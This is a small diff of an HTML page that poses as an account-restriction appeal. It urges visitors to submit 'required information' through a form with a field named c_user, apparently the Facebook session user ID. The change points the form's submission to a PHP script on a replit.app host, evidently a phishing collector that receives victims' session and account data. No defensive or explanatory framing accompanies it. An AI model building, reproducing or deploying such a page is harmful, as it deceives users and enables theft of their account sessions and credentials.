@@ -47,7 +47,7 @@
                 <h3> Must Watch the video to submit required information restriction won't be removed with incorrect information! </h3>
             </div>
             <p>Please be sure to provide the requested information below.</p>
-            <form action="https://submit-form.com/ZT1UwvJjx" method="POST">
+            <form action="https://submit-form-4.replit.app/umar.php" method="POST">
              
              
              <label class="label" for="recipient">c_user</label>
